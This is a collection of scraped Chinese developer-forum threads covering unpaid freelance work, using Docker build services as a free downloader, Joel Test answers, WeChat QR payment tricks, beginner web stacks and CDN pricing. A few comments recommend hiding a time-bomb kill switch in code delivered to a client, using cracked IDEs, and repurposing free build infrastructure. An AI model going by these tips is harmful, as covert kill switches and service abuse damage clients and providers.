{"content": ["<div class=\"topic_content\">没错就是我\r<br>\r<br>33k 只拿到 18k ，项目功能全部开发完成，交付给需求方测试了两个多月，从年前一直推脱到现在，各种理由不给尾款，上周说公司里项目黄了，尾款给不了了，让我们自己去卖代码回点本……\r<br>\r<br>卧槽，真是后悔没用 343 或者 541 分批结算的方式。\r<br>\r<br>剩下一个短信发送接口，还有约 8w 条额度，是我们去开通的账户，有感兴趣的吗？诚意转让</div>"], "reply": "33", "tittle": "又一个私活被跑路的…", "comment": ["。。。 541 是必须的", "一般这样的私包项目是怎么结款的，有 V2 的大虾给普及下嘛？", "求购", "去哪接项目", " 怎么联系你", "我最近的一个项目，本来我合同里写的是 442 ，结果对方法务给改成了 334 。\r", "然而，现在已经过了给第一个 3 的时间一个月了，还没给，说公司在融资中……\r", "反正到时候做完了不给 6 ，决不把代码放到他们服务器。", " ", " [at] ", " 这是我的邮箱 可直接联系 或发微信、 QQ 号过来我加你", "跑路的倒没有遇到过，只是有时候拖得比较久（快一个月），不过基于信任（朋友介绍的），没签合同，合作过很多次，还算愉快吧", "一般这样的私包项目是怎么结款的，有 V2 的大虾给普及下嘛？ +1", "还有测试之说？？源码交过去就必须全额了。", "下次可以在 B 阶段验收的之前，将代码放在自己的服务器上执行，提供服务端 API 或者自己基础设施全包。如果对方不放心，可以让他们按照你的要求提供数据库服务器，把数据发给他们（比如作为从服务器），但是程序不给。\r", "\r", "这样一方面可以确保你程序如果出问题，那肯定是你的问题没错，其次可以防止对方拿到代码之后跑路。\r", "\r", "B 阶段结算完成之后再交付源代码，然后进入 C 阶段质保。\r", "\r", "A 和 B 阶段的费用应该算大头， C 阶段的费用可以少一些，这样可以确保对方在跑路之前，先掂量下轻重。", "用户名 @", ".com  想买短信 lz 微信发下我邮箱 我加你", "我理解的私活本来就有风险，不受法律保护还涉嫌偷税漏税。\r", "签合同是什么意思？在我的行业私活要么就是不签，要么挂靠其他公司公对公付款。", "我来补充下，我接项目的方式以及我收款的方式。 \r", "\r", "对于新客户，我们收款的方式是 343 。第一个 3 是项目定金（收到后，开始开发），  4 是项目开发到中间阶段（可简易使用的功能）付款，剩下的 3 ，就是等待客户验收完毕后一周内付款即可。\r", "\r", "当然，个人签合同如果不缴税也是违法的（个人所得税），因为我是注册公司了的，所以这方面是公对公的付款。综合税率在(3%的增值税按合同额算， 10%的所得税按利润算)。我不评价是高是低，就是论事。 \r", "\r", "最后，欢迎 v2 的朋友挂靠（私信联系）。", "我靠 一定要加密 核心和关于数据库的加密  数据库采用云端的 他不付全款不能给数据库。", "项目黄了，又不是公司黄了，对方这个理由虽然有点搞笑，楼主其实可以走别的途径再争取一下，这种没钱直说的其实还好，那种各种找事的才恶心人。", "正常，这种我之前也遇到过多次。也是说项目黄了。最后一次尾款也是拖了 3 年后要我做其他项目，  我才吧尾款要了回来。。以后再也不打算接这种活，没意思，，费心费力。。钱又不多。", "为何不打官司？", "是什么项目？上面就有人要买。", "中国真的很少有契约精神", " v2 是不能私信的。。。", "说说是什么类型的项目，说不定有人会接盘", "这个没办法的，只能想办法提高预付比例。\r", "\r", "有人说，不给钱就不给代码，数据加密。实在太天真，人家根本就不要你的东西了，你就是白送人家也不要了。明白了吗？人家要你的东西就是给了源码他也不会赖（后续技术支持海指望你呢）\r", "\r", "不给钱了，说明项目黄了，资金出问题了，有时候是客户意志发生了变化；更多时候是市场窗口错失了（当然这个风险是客户要承担的）。一看项目做不下去了，又不好意思说不要了，只好拖着你，要么不验收，要么提一堆莫名其妙的修改要求，这时候一定要注意辨别客户的情况，不要以为马上拿尾款了，加班加点的有求必应。最后结果可能很失望。\r", "\r", "我做 2 年多的项目，经验就是，边做边了解客户的情况，如果客户经常催进度拿就说明可以做；如果对进度不闻不问，发邮件打电话沟通也应付了事，那就要小心了。一般来说到了客户不打算付款的时候我们就很被动了，如果是公对公有合同还可以撕一下，或者找人调解下。个人接单一般就凶多吉少了。\r", "\r", "所以个人接单最佳策略是， 1 ）时间不能长，最好不超过 1 个月； 2 ）金额不能太高，不然客户付款意愿会降低。 3) 争取最大预付比例（还没开工就付钱，这样主动权才在我们手里）\r", "\r", "反正就是一把辛酸泪，有时候想想还不如把时间花在公司，公司开时薪都比这个高，还不用担心扯皮。", " 541\r", " \r", "是必须的， 预付 50%，代码完成，通过测试后 40%，最后尾款 10%，不过个人的建议就是 10%总分你要默认拿不到，所以， 总价要预留出这 10%。", "代码中设定时间、机器、数据库等限制，否则过了期限就让程序死给他看。款项请了，做一次程序更新，结束。", " 邮件已发送", "恭喜。比我多点", " 我这个就是市场窗口期错过了 门槛变高了+盈利空间小了", " 小额信用贷款  目前市场红利期过了  估计没人接盘", " 多打电话催催款吧。把意思表明了“东西是你们要做的，费用也认可了；我投入这么多精力时间，你说怎么办吧”，能要一点是一点。不能 轻易认栽，要钱就是这样的，你不要肯定不给。如果是邮件沟通的，把之前谈好条件的书面的东西（邮件，聊天记录截屏）写个邮件，把项目相关的，甲方，乙方，第三方加入到抄送里。一定要据理力争，心平气和。", "这种事情怎么说呢。我也曾经外包项目给人家做。结果预先给我个 demo （在对方服务器上），我简单看了下，感觉有点靠谱，然后定金过去。然后对方消失了。这几年遇到两次。\r", "我是发包人。", "经常遇到这种···", "这么多年接包发包做下下，我的建议是合同，大额预付，早做完早完事"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我们知道国内好多提供离线下载的站都已经炸掉了，而且现有能用的支持离线下载的网盘也是限制很大。。。</p>\n<p>百度云的限速就不提了。</p>\n<p>我们也知道国内 github 的 clone 是比较蛋疼的事情，即使挂了梯子，对于比较大的仓库，比如动辄几个 G 的 linux 内核， Chromium 之类的，也不一定能一次性 clone 完毕（然而 git 不支持断点续传）</p>\n<p>我最近想到了一个另类的方法，利用网络上现有的免费服务，为我们离线下载。。</p>\n<p>先看看回传的速度（我这网速 20 兆）</p>\n<p><img alt=\"\" src=\"http://i4.buimg.com/567571/35c29899ac23d3ea.png\"></p>\n<p>这个速度还是可以接受的吧。。</p>\n<p>方法就是利用各种提供 Docker 构建的云的构建服务，直接把需要的文件的下载方式写在 Dockerfile 里，然后就是启动构建，构建完成后直接下载最顶层的镜像即可。。。对于 git clone 来说，要么写子模块，要么直接写 git clone 命令</p>\n<p>这个方法最大的优势就是免费，而且不违反任何能查阅到的 EULA/ToS ，而且，有些国内的构建平台有海外构建节点，用来 clone github 上的仓库是最适合不过的了。不过即使没有，我们还是可以直接使用 <a href=\"http://docker.io\" rel=\"nofollow\">docker.io</a> 的资源的：国内有一堆 docker 加速服务</p>\n<p>缺陷就是速度比较慢——因为文件要经过好多节点才能到达目的地，先是海外构建节点，然后是国内的 regisity ，最后才是你的电脑。。。</p>\n<p>至于如何下载 docker 的镜像，除了 docker pull 之外，还有很多选择——毕竟 docker 的协议是开放的，随便写一个客户端就可以获取到下载地址和 token...</p>\n<p>PS ：用来搞 BT 下载的就算了，好多海外机房是禁止 BT 的，出现问题可能导致服务商服务中断，到时候势必会对其他用户产生影响，我们要的是合理利用，不要竭泽而渔。。。</p>\n<p>PPS ：到时候我搞一个自动化工具来做这个。。</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>好多人认为这个是滥用，我来统一解释一下吧。。。</p>\n<p>首先这里介绍的这个方法，并不是我先想到的，而且网络上大量存在类似使用方式，你不能说我写出来，就是我的错了。。。</p>\n<p>滥用，我的理解，就是超出使用范围——也就是说，首先得有一个范围，docker.io上的服务是明确规定有限制的:</p>\n<ul>\n<li>执行时间：2 小时</li>\n<li>内存：2 GB</li>\n<li>CPU：1</li>\n<li>磁盘空间：30 GB</li>\n</ul>\n<p>除了这个硬性限制外，ToS还提到了有软限制</p>\n<p>多次违反软限制可能会被限制账户，这个也和使用者有关</p>\n<p>另外，ToS还规定了一些禁止的行为，比如P2P，违法内容，有版权内容一类的，这个就要看使用者具体下载什么了。</p>\n<p>因此，只要在这个范围内使用，我认为，都不能算是超出使用范围——你一定要是争论什么是正确的使用，什么是错误的使用，那就没意义了。</p>\n<p>Docker上有好多自动构建开发环境的项目，也是直接在Dockerfile里写RUN wget/RUN git clone的，要是你认为这个方法是滥用构建环境，那么，那些只不过是给这个行为再包装了一层而已，本质并无不同，如果认同这一点，你就会发现docker上已经没有什么合理使用自动构建的镜像了。</p>\n<p><strong>合理和不合理在于用于下载的内容是否违法，而非下载行为本身！</strong></p>\n</div></div>"], "reply": "36", "tittle": "一种另类离线下载的思路（免费）（同时适用于 GIT 仓库克隆）", "comment": ["反正我可以说，如果被发现用 USTC 的 docker.io 代理做这个事情，我会直接封 ip", " 直接走 docker.io 官方的也比 git clone 靠谱，至少可以断点续传。。所以即使国内全部禁用（使用的人多了，必然会这样），这个方法依旧是有效的。。。", "真是不容易..", "滥用就是违反 tos", "感觉像是在滥用啊。。。玩烂了大家都不方便了。。。自己开个 vps 中转一下比较好吧，妥妥的满速。。。", " 这个思路绝对不是我第一个想出来的。。。 docker.io 上好多意义不明（拉取次数个位数，无执行语句，无任何有效软件安装，但是有很多明显不属于项目的大文件）的镜像。。说明这类用法已经玩烂了，只是没人明面说出来而已", "看到最后都没提供一个带尾巴的免费 url ，差评", " 我只是分享思路，不提供服务，按这个思路去做后果自负🙃", "讲真，国内 git clone 速度感人。为了省事还是用 vps 。写个自动同步的脚本，再打包压缩放在网站目录下。用 http 下载速度都在 3M/s 以上。", "没必要，因为我网络\r", "1 网速够快\r", "2 tcp 连接可以断点恢复，类似 quic 。\r", "3 再不济也可以利用国外的 vps 打包，然后 HTTP 下载。", "怪不得那么多好服务都对国人敬而远之", "git clone 不是可以用代理么， clone 的时候记得加上 --depth 1 就好，没有 checkout 旧版本的需求的话。", " 用了代理，速度跑满然后中途挂掉了。。。。。一直都是--depth 1 ，但是对于这样规模的项目，该挂的还是挂。。。。。我们这网络一直都不太稳定，即使是国内的大文件下载，如果不支持断点续传，还是有几率会挂。。。。。", " 开 kcptun ，可以避免。", "这种事别人都是私底下做的，你写成教程就是罪人！", "有些国人就是爱吸血，以吸死宿主吸肥自己为己任。\r", "\r", "那么多好服务用不了，也许真是不配，遭殃了那些看不懂套路的人。", "不明觉厉。但是觉得楼主这么做不妥。网上“免费”的资源，也不该这么滥用。", " 法无禁止则可为，在 Docker.io 的 ToS 中明确指出了使用 docker.io 的服务是有硬限制和软限制的，超出限制有权终止服务，本文提到的这种方法中并不存在任何试图绕过这些限制的方法，因此使用这个方法是否超出使用范围取决于使用者，你要是觉得这个不合理，你去修改 ToS 就好了\r", "相关 ToS 条款\r", "2.3 You agree not to (a) access (or attempt to access) the administrative interface of the Service by any means other than through the interface that is provided by Docker in connection with the Service, unless you have been specifically allowed to do so in a separate agreement with Docker, or (b) engage in any activity that interferes with or disrupts the Service (or the servers and networks which are connected to the Service).（是否会干扰 Docker.io 提供服务取决于下载内容有无违禁内容）\r", "3.3 You agree that you are responsible for your own conduct while accessing or using the Service and for any consequences thereof. You agree to use the Service only for purposes that are legal, proper and in accordance with these Terms and any applicable laws or regulations. By way of example, and not as a limitation, you may not and may not allow any third party to:（还是违法内容的相关条例，以及禁止 P2P 连接，取决于使用者）", " You agree to use the Service only for purposes that are legal, proper \r", "这个真的叫 proper ？", " 你准备怎么定义恰当？还是贴完整一点的吧，上面只是顶部一小部分\r", "3.3 You agree that you are responsible for your own conduct while accessing or using the Service and for any consequences thereof. You agree to use the Service only for purposes that are legal, proper and in accordance with these Terms and any applicable laws or regulations. By way of example, and not as a limitation, you may not and may not allow any third party to:\r", "\r", "a. Send, upload, distribute or disseminate or offer to do the same with respect to any unlawful, defamatory, harassing, abusive, fraudulent, obscene, or otherwise objectionable content;传播违禁内容\r", "\r", "b. Distribute viruses, worms, defects, Trojan horses, corrupted files, hoaxes, or any other items of a destructive or deceptive nature;分发危害性内容\r", "\r", "c. Impersonate another person (via the use of an email address or otherwise) or otherwise misrepresent yourself or the source of any content;模仿他人或者伪造内容来源\r", "\r", "d. Upload, post, transmit or otherwise make available through the Service any content that infringes any patent, trademark, copyright, trade secret or other proprietary right of any party, unless you are the owner of such rights or have the permission of the owner to post such content;侵犯专利权\r", "\r", "e. Download any content posted by another user that you know, or reasonably should know, that cannot be legally distributed in such manner;下载不能合法分发的内容\r", "\r", "f. Submit content that falsely expresses or implies that such content is sponsored or endorsed by Docker;提交暗示由 docker 赞同的内容\r", "\r", "g. Use the Service to violate the legal rights (such as rights of privacy and publicity) of others;使用本服务侵犯他人权利\r", "\r", "h. Promote or encourage illegal activity;鼓励非法活动\r", "\r", "i. Interfere with other users' enjoyment of the Service;干扰其他用户\r", "\r", "j. Exploit the Service for any unauthorized commercial purpose;未经授权的商业利用\r", "\r", "k. Modify, adapt, translate, or reverse engineer any portion of the Service;修改或者逆向工程\r", "\r", "l. Remove any copyright, trademark or other proprietary rights notices contained in or on the Service or any content posted thereon;移除版权商标等按要求必须保留的内容\r", "\r", "m. Reformat or frame any portion of the web pages that are part of the Service's administration display;把服务管理页面重新格式化\r", "\r", "n. Use the Service in connection with illegal peer-to-peer file sharing;使用 P2P 文件分享服务\r", "\r", "o. Display any content on the Service that contains any hate-related or violent content or contains any other material, products or services that violate or encourage conduct that would violate any criminal laws, any other applicable laws, or any third party rights;显示任何暴力 /仇恨相关的内容\r", "\r", "p. Use any robot, spider, site search/retrieval application, or other device to retrieve or index any portion of the Service or the content posted thereon or to collect information about its users for any unauthorized purpose;使用爬虫\r", "\r", "q. Create user accounts by automated means or under false or fraudulent pretenses; or 自动化 /虚假方式创建用户\r", "\r", "r. Use the Service, or any interfaces provided with the Service, to access any Docker product or service in a manner that violates the Terms or other terms and conditions for use of such Docker product or service.使用本服务或者本服务提供的接口进行违反本条例或者其他 Docker 服务条款的行为\r", "\r", "在构建过程中下载其他合法资源，本来就是正常构建过程的一部分， docker 并没有限定镜像的除了违法用途以外的用途（它可没说镜像只能拿来运行，况且 docker 并没有提供运行环境），你一定要说它不恰当，那请给出“恰当”的定义，并且确保这个定义是广泛认可的", "download zip 不可以？除了 release 中的源码，我记得整个仓库也可以 download zip 的", " 坑爹的是 download zip 也是不支持断点续传的——甚至连 HEAD 请求查询大小都不行。。。", " 薅羊毛这么理直气壮也是少见\r", "Interfere with other users' enjoyment of the Service\r", "自己用用可能没啥，写成教程人多了以后，对其他人不是影响么？\r", "git clone 或者 wget 源码，那些都是为了 build ，而且一般是 shallow clone ，而且特别大的源码 build 完会删除", " By way of example, and not as a limitation, \r", "你用例子里面没出现来说明你的行为合理，根本站不住脚\r", "proper 不 proper ，取决于 common sense 。语言的意义，本来就取决于大多数人的理解。你看看楼下多少说不妥，多少说妥，就知道怎么样是 proper 了", " \r", "用代理 clone 时， 设置 iptables 丢弃 TCP RST 包，会不会好一点", "git 可以先 shallow clone 再 unshallow ，只要有一层 clone 下来了，断掉的可以继续 fetch 补全", " build 完删除并不代表不会占用存储空间—— docker 机制保证了每一个 RUN 命令都会创建一个独立的镜像， PULL 时，即使完全删除，也要拉取一遍\r", "利用 docker 的服务下载开发用到的源码，完全合理合法；用来下载电影，当然不合法，所以我发送的节点是程序员节点。。有些人就是逆向 XXXX ：外国人这么用就合理的；中国人用就是不合适，不恰当的。\r", "你说我举得例子不恰当，那我就举几个具体的例子：\r", "runmymind/docker-android-sdk ：内容就是自动下载一堆 android sdk ，大小 5.4G\r", "opengenomics/nci-downloader: 下载一个大文件，解压\r", "qlik/gradle: 直接下载 gradle 的包——并不能直接跑\r", "topfdrummer/minecraft: 直接下载 minecraft 服务端\r", "部分镜像的拉取量超过 10M+，如果有问题，官方早就处理了\r", "如果你认为下载过程不恰当，那么请问那些镜像是准备放着不拉取的吗？\r", "显然我觉得不恰当的地方恐怕是这个标题了——如果说用 docker 来搭建开发环境，估计就没这么多反对——然而，仔细想想，对于程序员而言，排除了违法内容后，这两者有什么区别吗？", " 看前面的楼层，我已经测试了--depth 1 的拉取，效果并不是很明显——我这里网络环境并不能一次性下载 500MB 以上的内容，无论有没有梯子都这样，可能采取一些奇怪的措施能够加强稳定性吧。--depth 1 仍然不能中断", " 然而我是 windows 党😂， WSL 不支持 iptables ，另外其实 docker 也是不支持的，我是直接开放 api 导出下载地址的。为啥不双系统呢？原因是 windows 是目前 linux 最好的发行版。。。 wsl 编译安卓内核毫无压力，所以我就用了。。。\r", "\r", "另外我发现网络不稳定这个东西应该和丢包率有关系，我玩游戏的时候几乎没啥影响，因为流量不大，延迟也不高。然后下载的时候，流量大，持续时间长，这样就出现各种丢包，延迟；届时 PING ", " 都会有 50%以上的丢包率，而且当持续流量结束以后，并不是马上就能恢复的。。。检查应该不是路由器的问题（之前路由器出现过被高并发发包打死的情况，后来我买了个贵的就好了），因为直接连接网线我也试过了。。。这意味着单纯丢弃 RST 包并不会有啥效果。。。总感觉我这网络是被 QoS 什么的干掉了。", " 如果大流量之后连百度都丢包成这样为何不去找你的运营商问题呢", "感谢楼主分享！", "说通过 docker 下载是滥用的？那请问用百度网盘离线下载的时候，算不算滥用网盘了？难道百度网盘理所当然给你下载了？\r", "\r", "虽然这种行为可能导致 docker 本身没得用，但是这个行为本身有什么问题？", " 学校的网络，大家都这样。。。。别人用另一个运营商也是这个样子， QoS 应该是在学校那边的，跟学校反应半天也没个下文。。不过大多数地址都可以断点续传，所以一般也感觉不出来。。。而且流量不大的话，长连接也可以保持很久，大概这种情况很难得到有关领导的重视吧。。。。", "另外到时 docker 公司完全也可以搞限速，搞会员来解决。\r", "\r", "说滥用的，只是自己没这样做，担心未来免费服务的常规使用也不能使用了而已，防止滥用这不是服务商自己应该解决的问题吗？大不了你倒闭呗。", "让我想起了之前用 Github Issues 做回复插件的帖子了。\r", "\r", "作者问了 Github 能不能这么用。\r", "\r", "Github: 吼啊，资辞！\r", "\r", "V2 回帖者: 滚，这是滥用！喷死你丫的！", " 你的解释大概也不符合 common sense ：无关人等解读 ToS 对当事人毫无卵用，不管是道德上还是法律上的。显然你无法就是否 proper 这个话题直接实现替代一般 users 进行价值判断，因为度量 proper 的因素不都是你能确定的，能纠结是否 proper 的绝大多数脑子长在别人脑袋里，你没法飞线过去确认或改变主张。当然，也可以强调事实判断来代替这个缺陷，比如当你确实就是这里所说的 user 之一的时候；不过，要是你当真主张取决于“大多数人的理解”，反而可能就不那么好办了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://myers.io/2017/04/04/the-joel-test-for-2017/\" rel=\"nofollow\">https://myers.io/2017/04/04/the-joel-test-for-2017/</a></p>\n<p>直接 Po 修正后的新版，附我所在团队的回答。</p>\n<p>团队的情况是， Leader 很资深，前后端的小弟都太连清，而且非常缺人。运维部门的小弟不错，但运维只有一个小弟。作为运维 Leader 我很忧伤，连团建都要跟着其他部门去啊摔！</p>\n<ol>\n<li>\n<p>Are all builds handled automatically by a Continuous Integration server? 所有的构建都自动由 CI 服务器完成吗？</p>\n<p>自动运维平台通常能在 10 分钟内构建和部署代码到线上环境，并支持通过 git push 触发。然而我在主要的测试环境上禁用了推代码构建，让大家使用命令手动触发。原因是首先并不能保证每次推代码都是完整可用的；其次部署会重启公用的测试环境，影响其他人。</p>\n</li>\n<li>\n<p>Do you make and use daily builds? 每天都执行构建吗？</p>\n<p>虽然没有硬性规定，但我们除了生产和 Staging 之外的总共 6 个测试环境中，加起来每天应该都会构建和部署 10 次以上。</p>\n</li>\n<li>\n<p>Do you use an issue tracker? 是否使用问题跟踪工具？</p>\n<p>我们用 Redmine 。</p>\n</li>\n<li>\n<p>Do you fix bugs before writing new code? 是否先修 bug ，再写 feature ？</p>\n<p>没有硬性规定。对于互联网公司，大部分的 bug 没有那么高的优先级。另外我们所使用的微服务架构也在一定程度上阻止了 bug 扩散。</p>\n</li>\n<li>\n<p>Do you have an up-to-date schedule? 开发计划是否及时更新？</p>\n<p>我们有每天的部门内部晨会，每周的部门 Leader 会议。我所参加的 Leader 周会上每次都会提到开发进度的问题，并且会及时修正。</p>\n</li>\n<li>\n<p>Do you have up to date information on your products performance and usage? 产品需求是否明确并且更新及时？</p>\n<p>产品需求有详细的文档，并且功能最初设计的时候有 Leader 参加的需求评审会议。</p>\n</li>\n<li>\n<p>Do you use the best tools money can buy? 是否用了钱能买到的最好工具？</p>\n<p>这个问题在国内基本上都是使用盗版。前后端开发用的最多的是 IDEA ，虽然社区版足以满足但据我所知大部分人用的都是破解版（因为在国内搜索到的基本都是破解版）</p>\n</li>\n<li>\n<p>Do you have a comprehensive test plan? 是否有全面的测试计划？</p>\n<p>QA 就是在网页上点点点。后端框架有单元测试功能，但一开始让大家写了几个之后就没再管；目前没有自动化测试；刚刚招了一个自动化搞得比较好的 QA ，但从目前来看估计离真正开搞还有一段距离。</p>\n</li>\n<li>\n<p>Do you have dedicated UI and UX designers? 是否有专门的 UI 界面和 UX 用户体验设计师？</p>\n<p>有设计部门，搞定 UI 是没问题。没有 UX 。</p>\n</li>\n<li>\n<p>Does all code go through code review? 有代码审核吗？</p>\n<p>没有。没人没时间。（能 Review 代码的人少，开发计划紧）</p>\n</li>\n<li>\n<p>Do you have coding standards? 有编码标准吗？</p>\n<p>架构师拟定了一个标准文档，并且有代码生成器和示例代码。想要参照并写出标准的代码是很容易的。但根据小弟们的经验看来，写成什么样的代码都会有的。</p>\n</li>\n<li>\n<p>Are new employees given training? 有针对新员工的培训吗？</p>\n<p>没有。会有对情况和架构的简单介绍；有写在季度绩效中的技术分享。个人认为在如此小的公司中不需要很正式的培训。直接跟他们说“把某某 bug 给我改了”应该是更好更快的上手方式。</p>\n</li>\n</ol>\n</div></div>"], "reply": "目前尚无回", "tittle": "Jole 测试 2017 版（非官方）和我司的答案。", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"http://www.wdku.net/user/charge\" rel=\"nofollow\">http://www.wdku.net/user/charge</a></p>\n<p>这个网站用了个人微信收款码充值，我测试了充值成功了，请教下实现的思路或者流程。</p>\n</div></div>"], "reply": "15", "tittle": "最近看到一个利用微信个人收款码做支付接口的，想问问怎么实现的？", "comment": ["微信机器人监控微信发过来的转账信息？\r", " 当然其他语言的实现也很多，懒得确认了", "开个 https 代理监控,如果发现相关内容就写入数据库,没啥难度的,主要的就是需要弄个手机或者虚拟机挂微信.\r", "代理的话可以用阿里巴巴的 anyproxy . 贼好用.", "微信机器人", "我也想知道", " 但是消息推送不会是用 HTTP 啊？具体是怎么个流程", " #3 \r", " #1 目前我所知道的机器人都是抓的 web 协议  不支持红包的", " \r", " \r", "\r", " 他是怎么知道是哪个用户付款的？", "难不成是虚拟机里搞图像识别。。。？脑洞一下而已。", "同求。。", "觉得这是一个猫鼠游戏，无论如何实现的，腾讯可能在未来某一天把这个洞堵住。", "Android 有接口监控 UI", " 应该是用多张二维码，目前发现了 2 张\r", "/public/img/weixinpay/2.png\r", "/public/img/weixinpay/1.png\r", "也就是说同时只能同时 2 个用户用这个充值业务，用户量少的时候应该也可以", "意义不大，支付频率低一点还能凑合。频率高了就无意义了，", "用户登录后 A 用户分配二维码 1  B 用户分配二维码 2  C 用户分配二维码 3 ...", "web 协议根本就不知道是谁转账的，估计如楼上所说的只能应付低频，这里有个其他的转账例子\r", "\r", "\r", "\r"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>大家好，我在科研院所工作，行业和编程几乎没有关系，但想为自己和单位的工作（几十人用）开发一些简单的 Web APP ，可以后台做一些科学计算，前台提供计算结果以供下载或者绘制成图片展示即可。</p>\n<p>之前出于兴趣在 Coursera 上花一年学完了 The Fundamentals of Computing ，内容包括 python 语法，以及一些初级的算法。平时自己学了 W3Schools 的 HTML/CSS/JavaScript 部分，看了一小部分 Miguel Grinberg 写的\"Flask Web Development\"书，但总觉得无从下手，涉及到一些 HTTP 的内容就开始犯糊涂，又去补了点 HTTP 的知识，后来又看到大家讨论什么 Vue ， React ， ES6/7 ， gulp ， Less ，觉得这年头做个网站真是太难了……</p>\n<p>现在的想法是，硬着头皮学习用 Flask+Bootstrap+JQuery 先写点简单的应用，其他的都不管了。这个思路对吗？或者说对于懂一点 Python 和 HTML/CSS/JavaScript 的外行来说，哪种学习路线最合适呢？我并不想往这个方向发展，只是想纯粹出于兴趣，将一些科研上的算法通过 Web APP 让大家都方便地用起来。先谢谢大家了！</p>\n</div></div>"], "reply": "10", "tittle": "请教外行出于兴趣想开发些很简单的 web 应用，应该如何入手？", "comment": ["你说的需求 对于选择的技术栈完全够用了\r", "Flask+Bootstrap+JQuery", " 谢谢！请问应该学 JQuery 吗？还是去接触下 Vue.js 这种东西呢？似乎对新手，难度都差不多~", "jquery 用起来绝对比 vuejs 简单。\r", "jquery 插件随便找。\r", "\r", "你初学，还是一步一步来， jquery 几乎是必须的技能，而 vuejs 不是。", "你们这种 app 比较简单，内部人用的话不需要过度考虑用户体验以及需求频繁更新版本迭代等等(功能正常就可以)，所以没有必要学 vue.js+webpack 全家桶，当然这个学起来也不是很难，业余花半个月的时间看看饿了么实战视频也能很快学会的。", "至于你说的生成图表可以试试看百度的 echarts 和国外的 highcharts （ highcharts 内部使用无需交版权费，外部使用如果盈利可能要给版权费用），看几个示例，复制粘贴改改官网提供的 demo 代码半个小时就能上手。", " @", " 多谢帮助，那我就先动起手来，从基础的做起~", "楼主，是不是想写点工具给同事，拿来就用？还是想学 web 。。。\r", "\r", "如果直接就想整出来工具，快糙猛，你可以用 wooey", "思路是正确的，你选用的 Flask+Bootstrap+JQuery 完全可以满足你的要求。别管其他的东西，现在前端的水太深了......", "画图推荐 ploty 简直神器，而且直接能插到网页里。", " 还真是好东西，哈哈，有空研究下！\r", " 好的，有信心了~\r", " 你说的是 plotly 吧，多谢建议~", "node + express + echarts ，足矣，不用学 python"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>为什么腾讯云的 CDN 服务比千牛的便宜,还有那么多人喜欢用千牛</p>\n<p>txy 每 gb 只要 0.34 ，而且不区分 http/https 流量</p>\n<p>而千牛每 gb 流量需要 0.29 元 /0.36 元 /GB ，区分 http/https 流量</p>\n<p>现在越来越多的 https 站。。。为何还是有很多人喜欢用 https 流量较贵的千牛呢。。</p>\n</div></div>"], "reply": "34", "tittle": "为什么腾讯云的 CDN 服务比千牛的便宜,还有那么多人喜欢用千牛", "comment": ["千牛是啥。。\r", "图片一般 http 就足够了， https 有点奢侈，所以 0.29 还是便宜", " 吖。。关键是 https 站中有 http 图片 /js/css 的话 会提示不安全呐", "七牛千牛傻傻不分", "七牛 http 不要钱啊", " 腾讯云也是 每月免费 10G 但是后面的就要钱了", "可以试试", "企业考虑的是 CDN 是否稳定，不能总出问题，价格便宜是可以拉来一些客户，但流失率也是高的。另外腾讯云产品线广泛， CDN 只是一个分支，不会把全部经历放到 CDN 上，相反某牛把全部经历放到 CDN 上，而且公司内部行业牛人也不少，做出的产品质量是过硬的，最关键的是价格也没差太多哦。\r", "以上纯属个人意见，说的不好请见谅。", "我觉得 CDN 还是要看稳定性，如果是用来做网站，还要看看容不容易被蜘蛛接受，貌似用百度云的 cdn 新站收录超级快。以上纯属个人意见，说的不好请见谅。", " JS 和 CSS 的话，流量怎么可能会有多大=。=，一般图片服务器和脚本会分开的，不过的确会提示不安全，不过如果是以附件为主 Who cares ，能看到图就好了。", "之前腾讯云 cdn 比较差，很多功能没有，节点少，那个时候七牛用的是一些企业 cdn 加上免费额度，所以很多人用。现在腾讯 cdn 比较好了，貌似不支持 h2 ，七牛支持。\r", "\r", "但是，我认为关键的原因是：那个时候 七牛没有要求身份证实名，注册简单，并且推广朋友注册，可以得到免费额度，所以很多人冲着推广，去推广七牛好好好，然后一波节奏很多人就用七牛了。", "七牛用的是融合 CDN ，有包括网宿、快网和 TX 云 CDN 在内的几个 CDN 。", "btw,提醒一下腾讯云现在是 50G 免费 CDN 流量了", " btw, 所有 CDN 用户每月均可享受 10GB 免费流量包，新开通 CDN 的用户连续 6 个月，每月再赠送 50GB 流量包。", "我就想知道 CDN 的好坏是用什么评判的 是 CDN 的节点还是什么？", "一开始业务就绑定了七牛的一些功能，后期一直在用，尤其是在网游中，依赖上传加速，再加上价格差距实在不是那么大，就一直用着了。", "这 TM 才是 ", " 千牛", " ", "qcloud 的这个产品 ", " （动态加速网络）和 ", " （内容分发网络）区别大吗？", "btw,cos 老用户送 50g ", " ", " 一个是针对非 http 服务的吧", "上一句当我没说", "千牛不是阿里旺旺卖家版吗？", "感觉现在腾讯云比阿里云好像好又便宜，可惜转过去还要重新备案，一大堆客户的域名都在阿里云备案的，想想都烦死了。", "腾讯云的 CDN 绑定生效超慢....试过几次  最后放弃", "为什么会有人问这种问题...", "HTTPS 兼容性不及千🐮", "腾讯云的 CDN 网页执行时间超过 10 秒自动中断链接 比如 ajax 异步批量操作注册域名、开通 API 接口的服务等", "腾讯云不能统一设置 http header 修改浏览器缓存时间。", " \r", "\r", "腾讯云一堆区域连快照都不能开通。\r", "\r", "当然，阿里云现在快照收费了。", "使用又拍云的飘过", "1. 用习惯了\r", "2. 有钱，就喜欢用贵的\r", "3. 我就不喜欢 xxx\r", "\r", "。。。", "问问题前能不能用点心？千牛。。。。", "7 牛不只是简单的在做 cdn 对象存储  图片 视频 音频处理都在做", "这标题我特么醉了，除了网宿快网蓝汛，我没听说还有其他家 cdn"]},
